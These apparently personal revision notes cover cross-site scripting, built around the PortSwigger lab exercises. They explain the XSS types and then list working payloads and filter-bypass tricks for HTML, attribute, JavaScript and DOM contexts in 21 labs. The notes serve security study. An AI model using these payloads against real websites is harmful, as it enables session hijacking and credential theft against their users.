# Pre-requisite questions 
1. What is cross site scripting ? 
Cross site scripting allows an attacker to compromise the interactions the user has with vulnerable application.
Usually it works by returning malicious javascript to users.

---
## 🛡️ XSS Proof of Concept (PoC)

- **Classic PoC:** Use `alert()` to confirm execution of injected JavaScript.  
- **Chrome version >= 92 change (July 2021):** Cross‑origin iframes can no longer call `alert()`.  
- **Impact:** Some advanced XSS labs relying on iframes break with `alert()`.  
- **Recommended alternative:** Use `print()` instead — short, harmless, and reliable in Chrome.  
- **Labs update:** Affected labs now accept both `alert()` and `print()`, with instructions noting this change.  

---

## Terms to understand  : 

- **source:** It means the entry by which attacker controlled input enters.
- **Sink:** : It basically means the area where the input lands.

---
## ⚔️ Types of XSS Attacks

- **Reflected XSS** → Payload comes from current HTTP request and is reflected in the response.  
- **Stored XSS** → Payload is saved in the server/database and served to users later.  
- **DOM‑Based XSS** → Vulnerability exists in client‑side JS; unsafe handling of input in the DOM triggers execution.

---

## 🎯 What XSS Can Be Used For
- Impersonate victim user  
- Perform user actions  
- Read accessible data  
- Steal login credentials  
- Deface website  
- Inject trojan functionality  

## ⚠️ Impact of XSS
- **Low:** Brochureware apps (anonymous/public info)  
- **High:** Apps with sensitive data (banking, email, healthcare)  
- **Critical:** Compromised privileged users → full app takeover  

## 🔍 Finding & Testing XSS
- Use scanners (e.g., Burp Suite) for quick detection  
- Manual testing: inject unique input → check reflections → craft payloads  
- DOM‑based: test URL params, search DOM, review JS code for unsafe sinks  

---

## 🛡️ Content Security Policy (CSP)
- Browser mechanism to mitigate XSS and related attacks.  
- Restricts sources of scripts, styles, and other resources.  
- Can hinder exploitation of XSS, but often possible to **circumvent** CSP to exploit underlying flaws.  

### 📖 Example CSP Header
```http
Content-Security-Policy: default-src 'self';
                        script-src 'self' https://cdn.example.com;
                        style-src 'self' 'unsafe-inline';
                        img-src 'self' data: https://images.example.com;
                        object-src 'none';
                        frame-ancestors 'none';
```
## 🧩 Dangling Markup Injection
- Technique for cross‑domain data capture when full XSS isn’t possible.  
- Works by injecting **incomplete HTML tags** so the browser misinterprets page structure.  
- Can leak sensitive info (e.g., CSRF tokens) → attacker can perform unauthorized actions.  
- Useful fallback when input filters or defenses block script execution.  
---
## 1. EVERYTHING ABOUT REFLECTED XSS:
## ⚠️ Impact of Reflected XSS
- Attacker‑controlled script runs in victim’s browser → full compromise possible.  
- Can:
  - Perform any user actions  
  - View/modify user data  
  - Interact with other users (appearing as victim)  

### 📤 Delivery
- Requires external mechanism (malicious link in email, tweet, attacker’s site, etc.).  
- Can target specific users or be broad/indiscriminate.  

### 🔎 Severity
- Generally **less severe** than Stored XSS (since it needs external delivery).  
- Still dangerous: session hijacking, credential theft, user impersonation.  
---
## 🔍 Finding & Testing Reflected XSS

- **Automated:** Use Burp Suite’s scanner for quick detection.  
- **Manual Steps:**
  1. **Test all entry points** → URL params, body, path, headers.  
  2. **Inject random value** (8‑char alphanumeric) → check if reflected.  
  3. **Identify reflection context** → HTML text, attribute, JS string, etc.  
  4. **Insert candidate payload** → e.g., `<script>alert(1)</script>` in Burp Repeater.  
  5. **Try alternative payloads** if filtered/modified.  
  6. **Confirm in browser** → e.g., `alert(document.domain)` popup shows execution.

### EXAMPLE :
Web application shows this for query search: 
```https
https://insecure-website.com/search?term=gift
```
It flows into the body in the following way :
```https
<p>You searched for: gift</p>
```
Then it can be exploited given no encoding is present : 
```https
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```
Reflects in the page like : 

```https
<p>You searched for: <script>/* Bad stuff here... */</script></p>
```
---

## 💾 Stored XSS (Persistent)
- Occurs when attacker input is **saved** (e.g., DB, comments, profiles) and later rendered unsafely in responses.  
- Example: Malicious `<script>` in a blog comment → executes for every visitor.  

### ⚠️ Impact
- Same as reflected XSS (user actions, data theft, defacement, trojans).  
- **Key difference:** Self‑contained in the app → no external delivery needed.  
- Especially dangerous for logged‑in users → guaranteed compromise.  

### 🔍 Finding & Testing
- Use Burp Suite scanner for detection.  
- Manually:  
  - Identify **entry points** (params, body, path, headers, external feeds).  
  - Track to **exit points** (responses, logs, feeds, UI).  
  - Insert unique values → confirm persistence.  
  - Test payloads based on context (HTML, attributes, JS).  
- Stored data may be overwritten, so test systematically.  

### 💾 Stored XSS Example
- User submits comment → stored in DB → shown in responses.  
- Normal input:  
  ```http
  POST /post/comment
  comment=This+post+was+extremely+helpful

  ```

- Normal output:  
  ```http
   Output: <p>This post was extremely helpful.</p>
  ```

- Malicious input:
  ```http
  comment=<script>/* Bad stuff here... */</script>
  ```
- Malicious Output:
  ```http
  comment=<script>/* Bad stuff here... */</script>
  ```

---

# XSS — Complete Revision Notes (PortSwigger Labs)

Quick-recall notes for all XSS contexts: HTML body, HTML attributes, and JavaScript. Read the concepts once, then use the table at the bottom for revision.

---

## 🧠 Core Concepts (Read First)

### The 3 Types of XSS
| Type | Meaning |
|------|---------|
| **Reflected** | Input goes in a request → comes back in the *same* response, unencoded → executes once, per-victim (needs a crafted link). |
| **Stored** | Input is saved server-side (DB/comment/profile) → rendered to *every* user who views that resource later. |
| **DOM-based** | Vulnerability lives entirely in **client-side JS** — a **source** (user-controlled data) flows into a **sink** (executes/renders it) without sanitization. No server round-trip needed. |

### DOM XSS: Sources & Sinks
- **Sources:** `location.hash`, `location.search`, `location.href`, `location.pathname`, `location.origin`, `document.referrer`, `document.cookie`, `document.URL`, `document.domain`, `window.name`
- **Sinks:** `document.write()`, `innerHTML`, `outerHTML`, `eval()`, jQuery `$()` selector, AngularJS `{{ }}`, `href="javascript:..."`

### The 3 XSS Contexts (this is the key mental model)
1. **HTML body context** — input lands between tags, e.g. `<p>INPUT</p>`. Break out with a new tag.
2. **HTML attribute context** — input lands inside `attr="INPUT"`. Either close the tag (`">`) or stay inside the attribute and add a new event handler (`" autofocus onfocus=alert(1) x="`).
3. **JavaScript context** — input lands inside a `<script>` block, JS string, or template literal. Break out of the string/script or use `${...}` if it's a template literal.

**General escalation logic when filters block you:**
- Tags blocked? → Try custom tags + `tabindex`/focus tricks.
- Angle brackets encoded? → Stay inside the attribute, don't try to make new tags.
- Quotes escaped? → Try double-escaping (`\'` → becomes `\\'`, freeing your quote).
- Everything escaped in an attribute? → Try **HTML-entity encoding** (`&apos;`) since browser decodes attribute values *before* JS runs.
- Input inside backticks (template literal)? → Use `${alert(1)}`, no need to break out at all.

---

## 📖 Section 1: HTML Body Context

### Lab 1 — Reflected XSS, nothing encoded
Backend: `<p>USER_INPUT</p>` — no encoding at all.
```html
<script>alert(1)</script>
```
**Why:** Input sits directly in HTML body; no filtering means any tag executes.

### Lab 2 — Stored XSS, nothing encoded
Same payload as Lab 1, but injected via a comment/field that's saved to DB and shown to all visitors.
```html
<script>alert(1)</script>
```
**Why:** Identical to reflected — the only difference is *persistence* (every viewer is a victim, not just the one who clicks a link).

---

## 📖 Section 2: DOM-Based XSS

### Lab 3 — `document.write` sink, source `location.search`
Backend JS:
```js
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
```
```
"><svg onload=alert(1)>
```
**Why:** `"` closes the `src="..."` attribute, `>` closes the `<img>` tag, then we inject a fresh `<svg onload>` element.

### Lab 4 — `document.write` sink inside a `<select>` element
```
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```
**Why:** Need to close `<option>`'s value, then close `</select>` itself, before injecting a new element — otherwise it's swallowed as invalid select content.

### Lab 5 — `innerHTML` sink
```html
<img src=1 onerror=alert(1)>
```
**Why:** `innerHTML` **never** executes `<script>` tags or fires `svg onload` — browsers block it by spec. `<img onerror>` / `<iframe onload>` still fire though.

### Lab 6 — jQuery anchor `href` sink
```
?returnUrl=javascript:alert(document.domain)
```
**Why:** Input lands inside an `<a href="...">`. A `javascript:` URI executes when the link is "clicked" (jQuery often auto-triggers it).

### Lab 7 — jQuery selector `$()` sink + `hashchange` event
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
**Why:** `$(location.hash)` selector executes HTML injected in the hash. No user click needed — the iframe's `onload` appends the payload to the hash, firing `hashchange` automatically.

### Lab 8 — AngularJS `{{ }}` expression sink
```
{{$on.constructor('alert(1)')()}}
```
**Why:** Inside any element scanned by AngularJS's `ng-app` directive, `{{ }}` is evaluated as a JS expression — bypasses HTML-encoding entirely since it's not HTML being parsed, it's Angular's own template engine.

---

## 📖 Section 3: Reflected XSS with Filters/WAF (HTML body)

### Lab 9 — Tags blocked (WAF)
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
**Why:** Fuzz allowed tags with Burp Intruder first. `<body onresize>` survives filtering; resizing the iframe (via `onload` changing its width) triggers the event.

### Lab 10 — All tags blocked except custom ones
```html
<script>location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>
```
Injected element: `<xss id=x onfocus=alert(document.cookie) tabindex=1>`
**Why:** Custom tags (`<xss>`) aren't focusable by default — only links, inputs, buttons, or elements with `tabindex` can receive focus. Adding `tabindex=1` makes it focusable; navigating to `#x` (via the outer script) focuses it, firing `onfocus`.

### Lab 11 — Event handlers & `href` blocked
```
%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```
Decoded: `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>`
**Why:** SVG's `<animate>` tag can *animate* the `href` attribute of `<a>` into a `javascript:` URI — sidesteps the direct event-handler/href block entirely.

### Lab 12 — Some SVG markup allowed
```
%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```
Decoded: `"><svg><animatetransform onbegin=alert(1)>`
**Why:** `onbegin` is an SVG-specific animation event, often missed by filters that only block common HTML event handlers like `onload`/`onerror`.

---

## 📖 Section 4: XSS in HTML Attributes

**Two general strategies:**
1. **Escape the tag** — `">` closes the attribute + tag, then inject fresh HTML.
2. **Stay inside the tag** — if angle brackets are blocked/encoded, close just the attribute (`"`) and add a new attribute/event handler in the same tag: `" autofocus onfocus=alert(document.domain) x="`.

### Lab 13 — Angle brackets HTML-encoded (attribute context)
```
" onmouseover="alert(1)
```
**Why:** Can't make new tags (brackets are encoded), so close the current attribute with `"`, add a new event-handler attribute, and the trailing `"` the backend appends closes it cleanly.

### Lab 14 — Stored XSS in anchor `href`, double quotes HTML-encoded
Context: `href="USER_INPUT"`
```
javascript:alert(1)
```
**Why:** Since quotes are encoded (can't break out), just make the *value itself* a `javascript:` URI — no escaping needed at all.

### Lab 15 — Reflected XSS in canonical `<link>` tag
```
'accesskey='x'onclick='alert(1)
```
**Why:** `<link>` tags don't normally support click/focus events, but `accesskey` + `onclick` lets you bind a keyboard-shortcut-triggered event to an otherwise inert tag.

---

## 📖 Section 5: XSS in JavaScript Context

### Lab 16 — JS string, single quote & backslash escaped → escape the `<script>` block entirely
```html
</script><img src=1 onerror=alert(document.domain)>
```
**Why:** If the string itself is fully sanitized, don't fight it — close the whole `</script>` tag and inject a fresh HTML element outside of it.

### Lab 17 — JS string, angle brackets HTML-encoded → break out of the string
```
'-alert(document.domain)-'
';alert(document.domain)//
```
**Why:** Angle brackets are encoded so we can't add new tags, but quotes aren't — so break out of the existing JS string using `'` and either concatenate (`-`) or terminate the statement (`;`) then comment out the rest (`//`).

### Lab 18 — Single quotes escaped (backslash-escape trick)
```
\';alert(document.domain)//
```
**Why:** The app auto-escapes `'` into `\'`. Send `\'` yourself → app turns your input into `\\'` → the first backslash "cancels out," and your quote becomes a **real, unescaped** string terminator.

### Lab 19 — JS URL context, some characters blocked
```
&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```
**Why:** Advanced technique abusing object `toString()` coercion and `onerror` as a property assignment to get code execution while avoiding blocked characters (like parentheses/spaces).

### Lab 20 — HTML-encoding bypass inside an event handler attribute
Context: `<a href="#" onclick="... var input='CONTROLLABLE'; ...">`
```
&apos;-alert(document.domain)-&apos;
```
**Why:** Browsers HTML-*decode* attribute values before handing them to the JS engine. So even if the server blocks literal `'`, sending the **HTML entity** `&apos;` sails through server-side filters, then gets decoded into a real `'` by the browser — breaking out of the JS string.

### Lab 21 — Template literal context (backticks), everything else Unicode-escaped
Context: `` var input = `CONTROLLABLE`; ``
```
${alert(1)}
```
**Why:** Template literals don't need to be "broken out of" at all — `${...}` is native JS expression syntax that gets evaluated automatically. No quotes, brackets, or backslashes required.

---

## ✅ Master Revision Table

| # | Lab Name | Context | Core Trick | Payload |
|---|----------|---------|------------|---------|
| 1 | Reflected, nothing encoded | HTML body | Direct tag injection | `<script>alert(1)</script>` |
| 2 | Stored, nothing encoded | HTML body | Same as above, persisted | `<script>alert(1)</script>` |
| 3 | DOM: `document.write` | HTML body (img attr) | Close attr+tag, add svg | `"><svg onload=alert(1)>` |
| 4 | DOM: `document.write` in `<select>` | HTML body | Close option+select | `"></select><img src=1 onerror=alert(1)>` |
| 5 | DOM: `innerHTML` | HTML body | script/svg-onload blocked → use img/iframe | `<img src=1 onerror=alert(1)>` |
| 6 | DOM: jQuery href | Attribute | `javascript:` URI | `javascript:alert(document.domain)` |
| 7 | DOM: jQuery `$()` selector | JS sink | iframe forces hashchange | `<iframe src="...#" onload="this.src+='<img src=x onerror=print()>'">` |
| 8 | DOM: AngularJS `{{ }}` | JS-as-template | Angular expression eval | `{{$on.constructor('alert(1)')()}}` |
| 9 | Tags blocked (WAF) | HTML body | Fuzz tags, use `onresize` + iframe | `<body onresize=print()>` via iframe |
| 10 | Only custom tags allowed | HTML body | `tabindex` + `onfocus` + `#frag` | `<xss id=x onfocus=alert(1) tabindex=1>` |
| 11 | Events/href blocked | HTML body | SVG `<animate>` on href | `<svg><a><animate attributeName=href values=javascript:alert(1)/></a></svg>` |
| 12 | Some SVG allowed | HTML body | Lesser-known SVG event | `<svg><animatetransform onbegin=alert(1)>` |
| 13 | Angle brackets encoded | Attribute | Stay inside tag, new attr | `" onmouseover="alert(1)` |
| 14 | Stored, href quotes encoded | Attribute | No escape needed, just use `javascript:` | `javascript:alert(1)` |
| 15 | Canonical `<link>` tag | Attribute | `accesskey` + `onclick` | `'accesskey='x'onclick='alert(1)` |
| 16 | JS string, quotes/backslash escaped | JS | Close `</script>` entirely | `</script><img src=1 onerror=alert(document.domain)>` |
| 17 | JS string, brackets encoded | JS | Break out of string with `'` | `'-alert(document.domain)-'` |
| 18 | JS string, quotes auto-escaped | JS | Double-escape backslash trick | `\';alert(document.domain)//` |
| 19 | JS URL, chars blocked | JS | `toString()`/`onerror` coercion abuse | `&%27},x=x=%3E{throw/**/onerror=alert,1337}...` |
| 20 | Event attr, everything escaped | JS-in-attribute | HTML entity decodes AFTER filter | `&apos;-alert(document.domain)-&apos;` |
| 21 | Template literal, all chars escaped | JS (backticks) | `${}` needs no escaping | `${alert(1)}` |

---

## 🎯 One-Line Cheat Summary
- **Nothing encoded** → just inject the tag/script directly.
- **Tags/brackets blocked** → work *inside* the existing attribute instead of making new tags.
- **Quotes escaped** → try double-escaping (`\'` trick) or HTML entities (`&apos;`).
- **`innerHTML` sink** → no `<script>`/`svg onload`, use `<img onerror>`.
- **Angular `{{ }}`** → treat as raw JS eval context.
- **Template literals (`` ` ``)** → use `${...}`, don't try to break out.
- **Custom-tags-only filter** → needs `tabindex` to become focusable for `onfocus` tricks.
